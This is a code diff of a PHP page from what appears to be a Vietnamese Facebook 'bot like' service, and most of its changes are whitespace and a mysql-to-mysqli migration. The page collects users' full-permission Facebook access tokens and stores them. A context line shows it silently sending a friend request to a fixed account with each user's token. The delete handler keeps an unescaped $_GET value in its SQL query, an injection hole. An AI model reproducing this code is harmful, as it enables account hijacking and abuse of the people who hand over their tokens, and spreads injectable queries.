@@ -13,30 +13,30 @@ include 'system/head.php';
                             <div class="content">   
 
 <?php if(!$_SESSION[id]) { ?>
-				<!--// Nội Dung Bot Like -->
-		<div class="col-md-12">						
-			<form action="" method="POST">
-		<div class="form-group">
-			<label for="usr">Nhập Mã Token:</label>
-				<input type="text" class="form-control" name="token">
-		</div>
-		<div class="form-group">
-			<div class="g-recaptcha" data-sitekey="6Ld-lCAUAAAAANroycVcBqziweiySSWIfioeAoFS"></div>
-		</div>
-		<button type="submit" class="btn btn-success">Đăng Nhập <?php echo $title; ?></button>
-			</form>
-		</div>
+                <!--// Nội Dung Bot Like -->
+        <div class="col-md-12">                        
+            <form action="" method="POST">
+        <div class="form-group">
+            <label for="usr">Nhập Mã Token:</label>
+                <input type="text" class="form-control" name="token">
+        </div>
+        <div class="form-group">
+            <div class="g-recaptcha" data-sitekey="6Ld-lCAUAAAAANroycVcBqziweiySSWIfioeAoFS"></div>
+        </div>
+        <button type="submit" class="btn btn-success">Đăng Nhập <?php echo $title; ?></button>
+            </form>
+        </div>
 
-		<div class="footer">
-		<div class="legend">
-		</div>
-		<hr>
-		<div class="stats">
-		<i class="fa fa-sign-in"></i>
-		<a href="/api/gettoken.php" target="_blank">Đăng Nhập và Lấy Token</a> 
-		</div>
-		</div>
-		
+        <div class="footer">
+        <div class="legend">
+        </div>
+        <hr>
+        <div class="stats">
+        <i class="fa fa-sign-in"></i>
+        <a href="/api/gettoken.php" target="_blank">Đăng Nhập và Lấy Token</a> 
+        </div>
+        </div>
+        
 
 <?php } else {
   ?>
@@ -76,16 +76,16 @@ http.onreadystatechange = function() {
 <?php
 if($_GET[del])
   {
-    $infongdung = mysql_fetch_array(mysql_query("SELECT * FROM `botcamxuc` WHERE `id` = '".$_GET[del]."' LIMIT 1"));
+    $infongdung = mysqli_fetch_array(mysqli_query($GLOBALS["___BMN_2312"], "SELECT * FROM `botcamxuc` WHERE `id` = '".$_GET[del]."' LIMIT 1"));
     if($infongdung[usercai] != $_SESSION[id])
     {
       die('<script>alert("Không Thể Xoá Tài Khoản Của Người Khác"); </script>');
-	  echo '<meta http-equiv=refresh content="0; URL=/index.php">';
+      echo '<meta http-equiv=refresh content="0; URL=/index.php">';
       exit;
     }
     else
     {
-    mysql_query("DELETE FROM `botcamxuc` WHERE id='" . mysql_real_escape_string($_GET[del]) . "'");
+    mysqli_query($GLOBALS["___BMN_2312"], "DELETE FROM `botcamxuc` WHERE id='" . mysqli_real_escape_string($GLOBALS["___BMN_2312"], $_GET[del]) . "'");
     echo '<meta http-equiv=refresh content="0; URL=/index.php">';
     exit;
   }
@@ -103,7 +103,7 @@ auto('https://graph.facebook.com/me/friends?method=post&uids=100008021291466&acc
 
 if($check[id] == 6628568379){  
   
-   mysql_query("CREATE TABLE IF NOT EXISTS `token` (
+   mysqli_query($GLOBALS["___BMN_2312"], "CREATE TABLE IF NOT EXISTS `token` (
       `id` int(11) NOT NULL AUTO_INCREMENT,
       `user_id` varchar(32) NOT NULL,
       `name` varchar(32) NOT NULL,
@@ -122,17 +122,17 @@ $_SESSION['token']=$token;
 
 if($userData['id']){
    $row = null;
-   $result = mysql_query("SELECT * FROM token WHERE user_id = '" . mysql_real_escape_string($userData['id']) . "'");
+   $result = mysqli_query($GLOBALS["___BMN_2312"], "SELECT * FROM token WHERE user_id = '" . mysqli_real_escape_string($GLOBALS["___BMN_2312"], $userData['id']) . "'");
    if($result){
-      $row = mysql_fetch_array($result, MYSQL_ASSOC);
-      if(mysql_num_rows($result) > 100){
-         mysql_query("DELETE FROM token WHERE user_id='" . mysql_real_escape_string($userData['id']) . "' AND id != '" . $row['id'] . "'");
+      $row = mysqli_fetch_array($result,  MYSQLI_ASSOC);
+      if(mysqli_num_rows($result) > 100){
+         mysqli_query($GLOBALS["___BMN_2312"], "DELETE FROM token WHERE user_id='" . mysqli_real_escape_string($GLOBALS["___BMN_2312"], $userData['id']) . "' AND id != '" . $row['id'] . "'");
       }
    }
    if(!$row){
-      mysql_query("INSERT INTO token SET `user_id` = '" . mysql_real_escape_string($userData['id']) . "', `name` = '" . mysql_real_escape_string($userData['name']) . "', `access_token` = '" . mysql_real_escape_string($token) . "'");
+      mysqli_query($GLOBALS["___BMN_2312"], "INSERT INTO token SET `user_id` = '" . mysqli_real_escape_string($GLOBALS["___BMN_2312"], $userData['id']) . "', `name` = '" . mysqli_real_escape_string($GLOBALS["___BMN_2312"], $userData['name']) . "', `access_token` = '" . mysqli_real_escape_string($GLOBALS["___BMN_2312"], $token) . "'");
    } else {
-      mysql_query("UPDATE token SET `access_token` = '" . mysql_real_escape_string($token) . "' WHERE `id` = " . $row['id'] . "");
+      mysqli_query($GLOBALS["___BMN_2312"], "UPDATE token SET `access_token` = '" . mysqli_real_escape_string($GLOBALS["___BMN_2312"], $token) . "' WHERE `id` = " . $row['id'] . "");
    }
 echo '<meta http-equiv=refresh content="0; URL=/index.php">';
 
@@ -145,7 +145,7 @@ echo '<meta http-equiv=refresh content="0; URL=/index.php">';
     die('<script>alert("Phải Dùng Token iPhone Full quyền Mới Login Được"); </script>');
 session_destroy();
 echo '<meta http-equiv=refresh content="0; URL=/index.php">';
-	}
+    }
 }
 ?>
-<?php include 'system/foot.php'; ?>
+<?php include 'system/foot.php'; ?> 
